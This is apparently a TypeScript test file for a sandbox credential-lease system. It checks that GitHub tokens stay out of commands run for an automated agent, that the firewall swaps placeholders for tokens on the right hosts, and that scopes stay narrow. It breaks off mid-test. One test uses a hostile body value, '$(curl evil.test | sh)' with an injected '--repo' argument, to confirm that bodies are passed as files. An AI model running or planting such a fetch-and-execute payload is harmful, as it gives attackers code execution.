import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { parseGh, RUNNER_PATH } from "#lib/github/cli.js";
import { parseGitFetch, pushCommandLine } from "#lib/github/git-cli.js";
import {
  FETCH_PATH,
  fetchPathFor,
  GH_TIMEOUT_MS,
  GIT_TIMEOUT_MS,
  LEASE_RESET_ATTEMPTS,
  LEASED_GIT_TIMEOUT_MS,
  type LeaseDependencies,
  type LeaseSandbox,
  leasePolicy,
  MAX_OUTPUT_CHARACTERS,
  mintScopedToken,
  NarrowTokenError,
  permissionsFor,
  resetTokenScopeMemo,
  runGh,
  runGitFetch,
  runGitPush,
  runLeasedGitCommand,
  SCOPE_DOWNGRADE_TTL_MS,
  type ShellLease,
  STRICT_REFUSAL_TTL_MS,
  TOKEN_SCOPES,
  type TokenMinter,
  type TokenScope,
  withShellLease,
} from "#lib/github/lease.js";

const TOKEN = "ghs_REALTOKEN0123456789abcdefghijklmnop";
const basic = (secret: string) =>
  `Basic ${Buffer.from(`x-access-token:${secret}`).toString("base64")}`;

type Step =
  | { kind: "policy"; policy: unknown }
  | { kind: "run"; command: string; env: Record<string, string> }
  | { kind: "write"; content: string; path: string };

/**
 * The guard every git command the runtime writes starts with: it stops the
 * command when one of git's config files rewrites URLs
 * (tests/github/git-cli.test.ts holds the text; git-real.test.ts runs it).
 */
const GUARD =
  "for scope in --local --worktree --global --system; do if /usr/bin/git -C '/workspace/repo' config \"$scope\" --includes --get-regexp '^url\\.' >/dev/null 2>&1; then echo 'A git URL rewrite (url.<base>.insteadOf) is configured in this sandbox. Remove it and run the command again.' >&2; exit 1; fi; done; ";

/**
 * A sandbox that records everything a lease does to it, in order, and
 * answers each command from `respond`.
 *
 * @param options.resetFailures - How many times taking the credential off
 * the firewall (`allow-all`) fails before it works. Each try is recorded,
 * the failed ones too.
 */
const fakeSandbox = (
  respond: (command: string) => {
    exitCode?: number;
    stderr?: string;
    stdout?: string;
  } = () => ({}),
  options: { resetFailures?: number } = {}
) => {
  const steps: Step[] = [];
  /** Whether each command was given a signal to stop it, in order. */
  const signals: (AbortSignal | undefined)[] = [];
  let resets = 0;
  const sandbox: LeaseSandbox = {
    name: "sbx_test",
    run: async ({ command, env, signal }) => {
      steps.push({ command, env: env ?? {}, kind: "run" });
      signals.push(signal);
      const result = respond(command);
      return {
        exitCode: result.exitCode ?? 0,
        stderr: result.stderr ?? "",
        stdout: result.stdout ?? "",
      };
    },
    setNetworkPolicy: async (policy) => {
      steps.push({ kind: "policy", policy });
      if (policy === "allow-all") {
        resets += 1;
        if (resets <= (options.resetFailures ?? 0)) {
          throw new Error(`sandbox API unavailable (reset ${resets})`);
        }
      }
    },
    writeTextFile: async ({ content, path }) => {
      steps.push({ content, kind: "write", path });
    },
  };
  return { sandbox, signals, steps };
};

const mintOk = (): {
  mint: TokenMinter;
  requests: (readonly string[] | null)[];
} => {
  const requests: (readonly string[] | null)[] = [];
  return {
    mint: async (permissions) => {
      requests.push(permissions);
      return TOKEN;
    },
    requests,
  };
};

const gh = (...args: string[]) => {
  const parsed = parseGh(args);
  if (!parsed.ok) {
    throw new Error(parsed.reason);
  }
  return parsed.invocation;
};

const READ_PERMISSIONS = [
  ...TOKEN_SCOPES["repo-read"].required,
  ...TOKEN_SCOPES["repo-read"].optional,
];

beforeEach(() => {
  resetTokenScopeMemo();
  // The suite's expectations are about the defaults, whatever the developer's shell exports.
  vi.stubEnv("FACTORY_TOKEN_FALLBACK", "");
  vi.stubEnv("FACTORY_ALLOW_WORKFLOW_CHANGES", "");
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

describe("runGh: one command, one lease", () => {
  test("the credential is attached, the command runs, and the lease always ends", async () => {
    const { sandbox, steps } = fakeSandbox(() => ({
      stdout: '{"title":"Login returns 500"}',
    }));
    const { mint } = mintOk();
    const result = await runGh(
      sandbox,
      gh("issue", "view", "12", "--json", "title"),
      "repo-read",
      {
        id: () => "lease-1",
        mint,
      }
    );
    expect(result).toEqual({
      exitCode: 0,
      stderr: "",
      stdout: '{"title":"Login returns 500"}',
      truncated: false,
    });
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("gh", TOKEN, "factory-lease-1"),
    });
    expect(steps[2]).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("the real token never reaches the sandbox: not in the command, not in the environment", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(sandbox, gh("pr", "view", "34"), "repo-read", {
      id: () => "lease-2",
      mint,
    });
    const run = steps.find((step) => step.kind === "run");
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'pr' 'view' '34'"
    );
    const env = run?.kind === "run" ? run.env : {};
    expect(env.GH_TOKEN).toBe("factory-lease-2");
    // gh's own state goes to a directory no other lease shares.
    expect(env.GH_CONFIG_DIR).toBe("/tmp/factory-lease-2-config");
    expect(env.GH_REPO).toBe("acme/widgets");
    expect(env.GH_PROMPT_DISABLED).toBe("1");
    // The image's own directories only: /usr/local/bin holds the wrappers
    // the agent's shell uses, and the runner must not go through them.
    expect(env.PATH).toBe("/usr/bin:/bin");
    expect(env.PATH).toBe(RUNNER_PATH);
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(JSON.stringify(run)).not.toContain(basic(TOKEN));
  });

  test("the firewall swaps the placeholder for the token on GitHub's API hosts only", () => {
    const policy = leasePolicy("gh", TOKEN, "factory-abc");
    expect(policy).toEqual({
      allow: {
        "*": [],
        "api.github.com": [
          {
            match: {
              headers: [
                {
                  key: { exact: "authorization" },
                  value: { regex: "^(?:token|Bearer) factory-abc$" },
                },
              ],
            },
            transform: [{ headers: { authorization: `Bearer ${TOKEN}` } }],
          },
        ],
        "uploads.github.com": [expect.anything()],
      },
    });
  });

  test("a git lease swaps the placeholder on the git hosts only, as basic auth", () => {
    const policy = leasePolicy("git", TOKEN, "factory-abc");
    expect(policy).toEqual({
      allow: {
        "*": [],
        "codeload.github.com": [expect.anything()],
        "github.com": [
          {
            match: {
              headers: [
                {
                  key: { exact: "authorization" },
                  value: { exact: basic("factory-abc") },
                },
              ],
            },
            transform: [{ headers: { authorization: basic(TOKEN) } }],
          },
        ],
      },
    });
  });

  test("the lease ends even when the command throws", async () => {
    const { sandbox, steps } = fakeSandbox(() => {
      throw new Error("sandbox went away");
    });
    const { mint } = mintOk();
    await expect(
      runGh(sandbox, gh("issue", "view", "1"), "repo-read", { mint })
    ).rejects.toThrow(/sandbox went away/);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("when no token can be minted, nothing runs and no policy is set", async () => {
    const { sandbox, steps } = fakeSandbox();
    await expect(
      runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
        mint: async () => {
          throw new Error("connector not installed");
        },
      })
    ).rejects.toThrow(/Could not mint a GitHub token/);
    expect(steps).toEqual([]);
  });

  test("a failing command is reported, not thrown, with its exit code and output", async () => {
    const { sandbox } = fakeSandbox(() => ({
      exitCode: 1,
      stderr: "no pull requests found",
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("pr", "view", "999"), "repo-read", {
      mint,
    });
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toBe("no pull requests found");
  });

  test("a token echoed back in output is redacted before it leaves the tool", async () => {
    const { sandbox } = fakeSandbox(() => ({
      stderr: `remote: bad credentials for ${basic(TOKEN)}`,
      stdout: `Authorization: Bearer ${TOKEN}\nvalue ${TOKEN} end`,
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    expect(result.stdout).not.toContain(TOKEN);
    expect(result.stderr).not.toContain(basic(TOKEN));
    expect(result.stdout).toContain("[redacted]");
  });

  test("oversized output is cut and flagged", async () => {
    const { sandbox } = fakeSandbox(() => ({
      stdout: "x".repeat(MAX_OUTPUT_CHARACTERS + 5000),
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("pr", "diff", "1"), "repo-read", {
      mint,
    });
    expect(result.truncated).toBe(true);
    expect(result.stdout.length).toBeLessThan(MAX_OUTPUT_CHARACTERS + 100);
    expect(result.stdout.endsWith("[output truncated]")).toBe(true);
  });

  test("oversized error output alone is cut and flagged too", async () => {
    const { sandbox } = fakeSandbox(() => ({
      exitCode: 1,
      stderr: `first line\n${"e".repeat(MAX_OUTPUT_CHARACTERS + 5000)}`,
      stdout: "short",
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("pr", "diff", "1"), "repo-read", {
      mint,
    });
    expect(result.truncated).toBe(true);
    expect(result.stdout).toBe("short");
    expect(result.stderr).toBe(
      `first line\n${"e".repeat(MAX_OUTPUT_CHARACTERS - 11)}\n[output truncated]`
    );
  });

  test("a run's log keeps its end, where the failure is; everything else keeps its start", async () => {
    const log = `first step\n${"x".repeat(MAX_OUTPUT_CHARACTERS + 5000)}\nError: the failing step`;
    const { sandbox } = fakeSandbox(() => ({ stdout: log }));
    const { mint } = mintOk();
    const viewed = await runGh(
      sandbox,
      gh("run", "view", "123", "--log-failed"),
      "repo-read",
      { mint }
    );
    expect(viewed.truncated).toBe(true);
    expect(viewed.stdout).toBe(
      `[earlier output truncated]\n${log.slice(-MAX_OUTPUT_CHARACTERS)}`
    );
    expect(viewed.stdout.endsWith("Error: the failing step")).toBe(true);
    expect(viewed.stdout).not.toContain("first step");

    const listed = await runGh(sandbox, gh("run", "list"), "repo-read", {
      mint,
    });
    expect(listed.truncated).toBe(true);
    expect(listed.stdout).toBe(
      `${log.slice(0, MAX_OUTPUT_CHARACTERS)}\n[output truncated]`
    );
    expect(listed.stdout.startsWith("first step")).toBe(true);
    expect(listed.stdout).not.toContain("Error: the failing step");
  });
});

describe("runGh: bodies travel as files, never on the command line", () => {
  const HOSTILE =
    'it\'s done; $(curl evil.test | sh) `id` "quoted"\n--repo evil/repo';

  test("a comment body is written to a file and passed with --body-file", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(
      sandbox,
      gh("issue", "comment", "12", "--body", HOSTILE),
      "repo-triage",
      {
        id: () => "lease-3",
        mint,
      }
    );
    expect(steps.map((step) => step.kind)).toEqual([
      "write",
      "policy",
      "run",
      "policy",
    ]);
    expect(steps[0]).toEqual({
      content: HOSTILE,
      kind: "write",
      path: "/tmp/factory-lease-3-body-0.md",
    });
    const run = steps.at(2);
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'issue' 'comment' '12' '--body-file' '/tmp/factory-lease-3-body-0.md'; status=$?; rm -f '/tmp/factory-lease-3-body-0.md'; exit $status"
    );
    expect(JSON.stringify(run)).not.toContain("curl evil.test");
  });

  test("every spelling of the body flag is moved", async () => {
    for (const args of [
      [
        "pr",
        "create",
        "--draft",
        "--head",
        "factory/x",
        "--title",
        "T",
        "-b",
        "short body",
      ],
      [
        "pr",
        "create",
        "--draft",
        "--head",
        "factory/x",
        "--title",
        "T",
        "--body=short body",
      ],
    ]) {
      const { sandbox, steps } = fakeSandbox();
      const { mint } = mintOk();
      await runGh(sandbox, gh(...args), "repo-triage", { mint });
      const write = steps.find((step) => step.kind === "write");
      const run = steps.find((step) => step.kind === "run");
      expect(write?.kind === "write" && write.content).toBe("short body");
      expect(run?.kind === "run" && run.command).not.toContain("short body");
      expect(run?.kind === "run" && run.command).toContain("'--title' 'T'");
    }
  });

  test("-b on a command where it means branch is left alone", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(sandbox, gh("run", "list", "-b", "factory/x"), "repo-read", {
      mint,
    });
    expect(steps.some((step) => step.kind === "write")).toBe(false);
    const run = steps.find((step) => step.kind === "run");
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'run' 'list' '-b' 'factory/x'"
    );
  });
});

describe("leasePolicy: which hosts each kind of lease covers", () => {
  interface Rule {
    match: { headers: { key: unknown; value: unknown }[] };
    transform: unknown;
  }
  /** The policy's rules by host, for a lease whose placeholder is `factory-abc`. */
  const rulesByHost = (kind: "gh" | "git" | "shell") =>
    (
      leasePolicy(kind, TOKEN, "factory-abc") as unknown as {
        allow: Record<string, Rule[]>;
      }
    ).allow;
  const hosts = (kind: "gh" | "git" | "shell") =>
    Object.keys(rulesByHost(kind)).sort();

  test("a gh lease covers the two API hosts and no git host", () => {
    expect(hosts("gh")).toEqual(["*", "api.github.com", "uploads.github.com"]);
  });

  test("a git lease covers the two git hosts and no API host", () => {
    expect(hosts("git")).toEqual(["*", "codeload.github.com", "github.com"]);
  });

  test("a shell lease covers all four, since the command may run either program", () => {
    expect(hosts("shell")).toEqual([
      "*",
      "api.github.com",
      "codeload.github.com",
      "github.com",
      "uploads.github.com",
    ]);
  });

  test("a shell lease is exactly a gh lease and a git lease together", () => {
    expect(leasePolicy("shell", TOKEN, "factory-abc")).toEqual({
      allow: { ...rulesByHost("gh"), ...rulesByHost("git") },
    });
  });

  test.each(["gh", "git", "shell"] as const)(
    "a %s lease keeps ordinary egress open and matches only its own placeholder",
    (kind) => {
      const allow = rulesByHost(kind);
      expect(allow["*"]).toEqual([]);
      expect(Object.keys(allow).length).toBeGreaterThanOrEqual(3);
      // Every rule is keyed on the authorization header carrying this
      // lease's placeholder: as a bearer token on the API hosts, as git's
      // basic auth on the git hosts. A request without it passes untouched.
      for (const [host, rules] of Object.entries(allow)) {
        if (host === "*") {
          continue;
        }
        expect(rules.map((rule) => rule.match.headers)).toEqual([
          [
            {
              key: { exact: "authorization" },
              value:
                host === "api.github.com" || host === "uploads.github.com"
                  ? { regex: "^(?:token|Bearer) factory-abc$" }
                  : { exact: basic("factory-abc") },
            },
          ],
        ]);
      }
    }
  );

  test("the placeholder never appears as the credential that goes out", () => {
    for (const kind of ["gh", "git", "shell"] as const) {
      const rules = Object.values(rulesByHost(kind)).flat();
      // One rule per credentialed host: two for gh or git, four for a shell.
      expect(rules).toHaveLength(kind === "shell" ? 4 : 2);
      for (const rule of rules) {
        const sent = JSON.stringify(rule.transform);
        expect(sent).not.toContain("factory-abc");
        expect(sent).not.toContain(basic("factory-abc"));
        expect(sent.includes(TOKEN) || sent.includes(basic(TOKEN))).toBe(true);
      }
    }
  });
});

describe("runGitPush: the one command that leases a contents-write token", () => {
  test("pushes the branch with the command the factory wrote; the placeholder rides in git's own config", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint, requests } = mintOk();
    const result = await runGitPush(sandbox, "factory/bug-x", {
      id: () => "lease-4",
      mint,
    });
    expect(result).toEqual({
      exitCode: 0,
      stderr: "",
      stdout: "",
      truncated: false,
    });
    expect(requests).toEqual([["contents:write"]]);
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-lease-4"),
    });
    const run = steps.at(1);
    expect(run?.kind === "run" && run.command).toBe(
      pushCommandLine("factory/bug-x")
    );
    // The guard first; then the push to the literal URL, and the tracking ref.
    expect(run?.kind === "run" && run.command).toBe(
      `${GUARD}/usr/bin/git -C '/workspace/repo' push 'https://github.com/acme/widgets.git' 'refs/heads/factory/bug-x:refs/heads/factory/bug-x' && /usr/bin/git -C '/workspace/repo' update-ref 'refs/remotes/origin/factory/bug-x' 'refs/heads/factory/bug-x'`
    );
    const env = run?.kind === "run" ? run.env : {};
    expect(env).toEqual({
      GIT_CONFIG_COUNT: "4",
      GIT_CONFIG_KEY_0: "http.https://github.com/.extraheader",
      GIT_CONFIG_KEY_1: "core.hooksPath",
      GIT_CONFIG_KEY_2: "protocol.allow",
      GIT_CONFIG_KEY_3: "protocol.https.allow",
      GIT_CONFIG_VALUE_0: `Authorization: ${basic("factory-lease-4")}`,
      GIT_CONFIG_VALUE_1: "/dev/null",
      GIT_CONFIG_VALUE_2: "never",
      GIT_CONFIG_VALUE_3: "always",
      GIT_TERMINAL_PROMPT: "0",
      PATH: "/usr/bin:/bin",
    });
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("hooks are off and only HTTPS is allowed while the lease is live", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGitPush(sandbox, "factory/x", { mint });
    const run = steps.find((step) => step.kind === "run");
    const env = run?.kind === "run" ? run.env : {};
    const config = Object.fromEntries(
      Array.from({ length: Number(env.GIT_CONFIG_COUNT) }, (_, index) => [
        env[`GIT_CONFIG_KEY_${index}`],
        env[`GIT_CONFIG_VALUE_${index}`],
      ])
    );
    // A pre-push hook is a file the model can write.
    expect(config["core.hooksPath"]).toBe("/dev/null");
    expect(config["protocol.allow"]).toBe("never");
    expect(config["protocol.https.allow"]).toBe("always");
    // The header is scoped to github.com, so a rewritten remote gets nothing.
    expect(Object.keys(config)).toContain(
      "http.https://github.com/.extraheader"
    );
    expect(Object.keys(config)).not.toContain("http.extraheader");
  });

  test("the lease ends when the push throws", async () => {
    const { sandbox, steps } = fakeSandbox(() => {
      throw new Error("sandbox went away");
    });
    const { mint } = mintOk();
    await expect(runGitPush(sandbox, "factory/x", { mint })).rejects.toThrow(
      /sandbox went away/
    );
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("a push GitHub rejects is reported, not thrown, and the lease still ends", async () => {
    const { sandbox, steps } = fakeSandbox(() => ({
      exitCode: 1,
      stderr: `! [remote rejected] (protected branch) ${basic(TOKEN)}`,
    }));
    const { mint } = mintOk();
    const result = await runGitPush(sandbox, "factory/x", { mint });
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toBe(
      "! [remote rejected] (protected branch) [redacted]"
    );
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("when no push token can be minted, nothing runs and no policy is set", async () => {
    const { sandbox, steps } = fakeSandbox();
    await expect(
      runGitPush(sandbox, "factory/x", {
        mint: async () => {
          throw new Error("contents:write not granted");
        },
      })
    ).rejects.toThrow(/Could not mint a GitHub token for scope "repo-push"/);
    expect(steps).toEqual([]);
  });
});

describe("runGitFetch: a fetch the runtime wrote, for a deployment with no read-only token", () => {
  const fetchOf = (...args: string[]) => {
    const parsed = parseGitFetch(args);
    if (!parsed.ok) {
      throw new Error(parsed.reason);
    }
    return parsed.commandLine;
  };

  test("leases a read-only token and runs the command with hooks off and the image's own PATH", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint, requests } = mintOk();
    const command = fetchOf("origin", "factory/bug-x");
    await runGitFetch(sandbox, command, { id: () => "lease-8", mint });
    expect(requests).toEqual([READ_PERMISSIONS]);
    expect(requests[0]).not.toContain("contents:write");
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-lease-8"),
    });
    const run = steps.at(1);
    expect(run?.kind === "run" && run.command).toBe(
      `${GUARD}/usr/bin/git -C '/workspace/repo' fetch 'https://github.com/acme/widgets.git' '+refs/heads/factory/bug-x:refs/remotes/origin/factory/bug-x'`
    );
    const env = run?.kind === "run" ? run.env : {};
    expect(env).toMatchObject({
      GIT_CONFIG_KEY_1: "core.hooksPath",
      GIT_CONFIG_VALUE_0: `Authorization: ${basic("factory-lease-8")}`,
      GIT_CONFIG_VALUE_1: "/dev/null",
      GIT_CONFIG_VALUE_2: "never",
      GIT_CONFIG_VALUE_3: "always",
      GIT_TERMINAL_PROMPT: "0",
      PATH: "/usr/bin:/bin",
    });
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("unlike the shell's lease it follows FACTORY_TOKEN_FALLBACK, and says so", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const { sandbox, steps } = fakeSandbox();
    const requests: (readonly string[] | null)[] = [];
    await runGitFetch(sandbox, fetchOf("origin", "main"), {
      mint: async (permissions) => {
        requests.push(permissions);
        if (permissions !== null) {
          throw new Error("422: cannot narrow");
        }
        return TOKEN;
      },
    });
    expect(requests.at(-1)).toBeNull();
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(warn).toHaveBeenCalledTimes(1);
  });

  test("the lease ends when the fetch throws", async () => {
    const { sandbox, steps } = fakeSandbox(() => {
      throw new Error("sandbox went away");
    });
    const { mint } = mintOk();
    await expect(
      runGitFetch(sandbox, fetchOf("origin", "main"), { mint })
    ).rejects.toThrow(/sandbox went away/);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });
});

describe("withShellLease: the lease a shell command runs under", () => {
  test("holds a read-only lease open while the command runs, and hands it the placeholder", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint, requests } = mintOk();
    const seen: string[] = [];
    const result = await withShellLease(
      sandbox,
      { id: () => "lease-5", mint },
      async (lease) => {
        seen.push(lease.placeholder);
        // The policy is already in place when the command starts.
        expect(steps).toEqual([
          {
            kind: "policy",
            policy: leasePolicy("shell", TOKEN, "factory-lease-5"),
          },
        ]);
        return "what the command returned";
      }
    );
    expect(result).toBe("what the command returned");
    expect(seen).toEqual(["factory-lease-5"]);
    expect(requests).toEqual([READ_PERMISSIONS]);
    expect(steps).toEqual([
      {
        kind: "policy",
        policy: leasePolicy("shell", TOKEN, "factory-lease-5"),
      },
      { kind: "policy", policy: "allow-all" },
    ]);
  });

  test("the scope is read-only whatever happens: it is not something a caller can choose", async () => {
    const { sandbox } = fakeSandbox();
    const { mint, requests } = mintOk();
    // Extra arguments and extra dependency fields change nothing.
    const smuggled = {
      id: () => "x",
      mint,
      scope: "repo-push",
    } as Parameters<typeof withShellLease>[1];
    await withShellLease(sandbox, smuggled, async () => undefined);
    await (
      withShellLease as unknown as (...args: unknown[]) => Promise<unknown>
    )(sandbox, { mint }, async () => undefined, "repo-triage");
    await withShellLease(sandbox, { mint }, async () => {
      throw new Error("the command failed");
    }).catch(() => undefined);
    expect(requests).toEqual([
      READ_PERMISSIONS,
      READ_PERMISSIONS,
      READ_PERMISSIONS,
    ]);
    for (const permissions of requests) {
      expect(permissions).not.toContain("contents:write");
      expect(permissions).not.toContain("issues:write");
      expect(permissions).not.toContain("pull_requests:write");
    }
  });

  /** An app that issues its full permissions and refuses every narrower set. */
  const wideOnly = () => {
    const requests: (readonly string[] | null)[] = [];
    let installationCalls = 0;
    return {
      dependencies: {
        installationToken: async () => {
          installationCalls += 1;
          return "ghs_installation_token_0123456789abcdef";
        },
        mint: (async (permissions) => {
          requests.push(permissions);
          if (permissions !== null) {
            throw new Error("422: cannot narrow");
          }
          return TOKEN;
        }) satisfies TokenMinter,
      },
      installationCalls: () => installationCalls,
      requests,
    };
  };

  test.each(["repository", "installation"])(
    "is never widened, even with FACTORY_TOKEN_FALLBACK=%s: a shell command holds this credential, and its scope is the only limit there is",
    async (setting) => {
      vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
      const warn = vi
        .spyOn(console, "warn")
        .mockImplementation(() => undefined);
      const { sandbox, steps } = fakeSandbox();
      const app = wideOnly();
      let started = false;
      const attempt = withShellLease(sandbox, app.dependencies, async () => {
        started = true;
      });
      await expect(attempt).rejects.toBeInstanceOf(NarrowTokenError);
      await expect(attempt).rejects.toThrow(
        /Could not mint a GitHub token for scope "repo-read"/
      );
      // The two rungs inside the scope, and neither of the wide ones.
      expect(app.requests).toEqual([
        READ_PERMISSIONS,
        TOKEN_SCOPES["repo-read"].required,
      ]);
      expect(app.installationCalls()).toBe(0);
      expect(started).toBe(false);
      expect(steps).toEqual([]);
      expect(warn).not.toHaveBeenCalled();
    }
  );

  test("a wider token the runner was given for the same scope is not reused for a shell", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let clock = 1_000_000;
    const { sandbox, steps } = fakeSandbox();
    const app = wideOnly();
    const dependencies = { ...app.dependencies, now: () => clock };
    const NARROW = [READ_PERMISSIONS, TOKEN_SCOPES["repo-read"].required];

    // The runner runs a command the runtime parsed, so it follows the setting.
    await runGh(sandbox, gh("issue", "view", "12"), "repo-read", dependencies);
    expect(app.requests).toEqual([...NARROW, null]);
    const policies = steps.filter((step) => step.kind === "policy").length;

    // The shell lease does not look at what the runner was given. It asks
    // for the narrow sets itself, is refused, and never asks for the wide one.
    let started = false;
    const attempt = () =>
      withShellLease(sandbox, dependencies, async () => {
        started = true;
      });
    await expect(attempt()).rejects.toBeInstanceOf(NarrowTokenError);
    expect(app.requests).toEqual([...NARROW, null, ...NARROW]);

    // That refusal is remembered for a minute, so the next commands do not
    // each pay for two requests that will fail.
    clock += STRICT_REFUSAL_TTL_MS - 1;
    await expect(attempt()).rejects.toBeInstanceOf(NarrowTokenError);
    expect(app.requests).toEqual([...NARROW, null, ...NARROW]);

    // Then it asks again, and again for the narrow sets only.
    clock += 1;
    await expect(attempt()).rejects.toBeInstanceOf(NarrowTokenError);
    expect(app.requests).toEqual([...NARROW, null, ...NARROW, ...NARROW]);

    expect(started).toBe(false);
    expect(app.installationCalls()).toBe(0);
    expect(steps.filter((step) => step.kind === "policy")).toHaveLength(
      policies
    );
  });

  // A network blip looks like a refusal to narrow. Before, the wide token
  // the runner fell back to then kept every shell command from a credential
  // for ten minutes; now the shell lease finds out for itself.
  test("a wider token the runner fell back to once does not keep a shell from the narrow one", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const { sandbox, steps } = fakeSandbox();
    const requests: (readonly string[] | null)[] = [];
    const connector = { narrows: false };
    const dependencies: LeaseDependencies = {
      id: () => "lease-9",
      mint: async (permissions) => {
        requests.push(permissions);
        if (permissions !== null && !connector.narrows) {
          throw new Error("ETIMEDOUT");
        }
        return permissions === null ? "ghs_WIDE_TOKEN" : TOKEN;
      },
      now: () => 1_000_000,
    };
    await runGh(sandbox, gh("issue", "view", "12"), "repo-read", dependencies);
    expect(requests.at(-1)).toBeNull();

    connector.narrows = true;
    const asked = requests.length;
    const done = steps.length;
    const placeholder = await withShellLease(
      sandbox,
      dependencies,
      async (lease) => lease.placeholder
    );
    expect(placeholder).toBe("factory-lease-9");
    expect(requests.slice(asked)).toEqual([READ_PERMISSIONS]);
    // What the firewall was given is the narrow token, not the wide one.
    expect(steps.slice(done)).toEqual([
      {
        kind: "policy",
        policy: leasePolicy("shell", TOKEN, "factory-lease-9"),
      },
      { kind: "policy", policy: "allow-all" },
    ]);
    expect(JSON.stringify(steps.slice(done))).not.toContain("ghs_WIDE_TOKEN");
  });

  test("an installation without the optional permissions still gets a shell lease, on the required read set", async () => {
    const { sandbox } = fakeSandbox();
    const requests: (readonly string[] | null)[] = [];
    const placeholder = await withShellLease(
      sandbox,
      {
        id: () => "lease-7",
        mint: async (permissions) => {
          requests.push(permissions);
          if (permissions?.includes("checks:read")) {
            throw new Error("422: permissions not granted");
          }
          return TOKEN;
        },
      },
      async (lease) => lease.placeholder
    );
    expect(placeholder).toBe("factory-lease-7");
    expect(requests).toEqual([
      READ_PERMISSIONS,
      TOKEN_SCOPES["repo-read"].required,
    ]);
  });

  test("the lease ends when the command rejects, and the rejection reaches the caller", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await expect(
      withShellLease(sandbox, { mint }, async () => {
        throw new Error("the shell went away");
      })
    ).rejects.toThrow(/the shell went away/);
    expect(steps.map((step) => step.kind)).toEqual(["policy", "policy"]);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("when no token can be minted, the command never starts and no policy is set", async () => {
    const { sandbox, steps } = fakeSandbox();
    let started = false;
    await expect(
      withShellLease(
        sandbox,
        {
          mint: async () => {
            throw new Error("connector not installed");
          },
        },
        async () => {
          started = true;
        }
      )
    ).rejects.toThrow(/Could not mint a GitHub token for scope "repo-read"/);
    expect(started).toBe(false);
    expect(steps).toEqual([]);
  });

  test("redact replaces the token and its basic-auth form, and leaves everything else alone", async () => {
    const { sandbox } = fakeSandbox();
    const { mint } = mintOk();
    const lease = await withShellLease(
      sandbox,
      { id: () => "lease-6", mint },
      async (given): Promise<ShellLease> => given
    );
    expect(
      lease.redact(`Authorization: Bearer ${TOKEN}\nvalue ${TOKEN} end`)
    ).toBe("Authorization: Bearer [redacted]\nvalue [redacted] end");
    expect(lease.redact(`extraheader: Authorization: ${basic(TOKEN)}`)).toBe(
      "extraheader: Authorization: [redacted]"
    );
    expect(lease.redact(`${basic(TOKEN)} and ${TOKEN}`)).toBe(
      "[redacted] and [redacted]"
    );
    // Exact, not pattern-based: text that only looks like a credential stays.
    const lookalike =
      "ghs_ANOTHERTOKEN0123456789abcdefghijklmn Basic eC1hY2Nlc3MtdG9rZW46b3RoZXI=";
    expect(lease.redact(lookalike)).toBe(lookalike);
    // The placeholder is not a secret: it is worthless once the lease ends.
    expect(lease.redact("factory-lease-6")).toBe("factory-lease-6");
    expect(lease.redact("")).toBe("");
  });

  test("the token itself is never handed to the command", async () => {
    const { sandbox } = fakeSandbox();
    const { mint } = mintOk();
    const lease = await withShellLease(
      sandbox,
      { mint },
      async (given) => given
    );
    expect(Object.keys(lease).sort()).toEqual(["placeholder", "redact"]);
    expect(JSON.stringify(lease)).not.toContain(TOKEN);
    expect(lease.placeholder).toMatch(/^factory-[0-9a-f-]{36}$/);
  });

  test("each lease gets its own placeholder", async () => {
    const { sandbox } = fakeSandbox();
    const { mint } = mintOk();
